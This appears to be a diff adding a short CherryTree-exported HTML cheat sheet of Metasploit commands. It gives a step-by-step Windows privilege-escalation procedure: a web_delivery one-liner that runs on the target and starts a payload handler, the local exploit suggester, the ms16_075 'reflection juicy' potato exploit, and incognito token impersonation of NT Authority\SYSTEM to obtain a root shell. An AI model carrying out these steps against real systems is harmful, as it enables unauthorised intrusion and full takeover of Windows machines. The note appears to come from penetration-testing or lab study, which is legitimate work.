@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>msf</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>msf</h1><br/>(not actually for tokens but super cool)<br />	use exploit/multi/script/web_delivery		(This is for making a one liner to copy into the target box and execute. This also starts the payload handler)<br /><br />if post/multi/recon/local_exploit_suggester suggests ms16_075_reflection or reflection_juicy, we are about to do a potato attack.<br /><br />use exploit/windows/local/ms16_075_reflection_juicy<br />run it to get your next shell<br />go into the session<br />load incognito<br />list_tokens -u<br />impersonate_token “NT Authority\system”<br />shell<br />(rooted)</div></body></html>
